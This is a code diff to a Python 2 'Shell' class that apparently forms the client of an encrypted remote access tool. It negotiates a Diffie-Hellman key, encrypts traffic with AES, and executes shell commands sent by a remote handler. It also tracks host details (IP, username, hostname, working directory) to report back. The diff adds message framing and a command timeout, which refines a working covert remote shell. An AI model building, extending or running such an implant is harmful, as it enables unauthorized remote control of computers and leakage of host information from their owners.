@@ -17,6 +17,8 @@ class Shell:
 		self.possible_info = ["cwd","ip","data","username","localtime","hostname"]
 		self.sent_info = ["cwd","ip","data","username","localtime","hostname"]
 		
+		self.killed = False
+		
 	def gen_diffie_key(self):
 		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
 		base = 2
@@ -56,8 +58,11 @@ class Shell:
 		self.aes_obj = AES.new(key, AES.MODE_CFB, IV)
 		
 	def get_data(self):
-		data = self.comm_socket.recv(4096)
-		if not data: raise Exception("Handler disconnected")
+		data = ""
+		while not data.endswith(chr(255)):
+			c = self.comm_socket.recv(4096)
+			if not c: raise Exception("Handler disconnected")
+			data += c
 		data = self.decrypt(data)
 		return data
 		
@@ -94,7 +99,7 @@ class Shell:
 	def send_data(self, data):
 		data_package = self.package(data)
 		data_package = self.encrypt(data_package)
-		self.comm_socket.sendall(data_package)
+		self.comm_socket.sendall(data_package+chr(255))
 		
 	def kill_proc(self, pid):
 		print "kill proc firing"
@@ -102,13 +107,16 @@ class Shell:
 		for proc in process.children(recursive=True):
 			proc.terminate()
 		process.terminate()
+		self.killed = True
 		
 	def execute_shell_command(self, command):
 		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 		timer = threading.Timer(60, self.kill_proc, [proc.pid])
 		timer.start()
 		out = proc.stdout.read() + proc.stderr.read()
+		if self.killed: out += " (Process terminated after taking too long to execute)"
 		timer.cancel()
+		self.killed = False
 		return out
 		
 	@windows_only
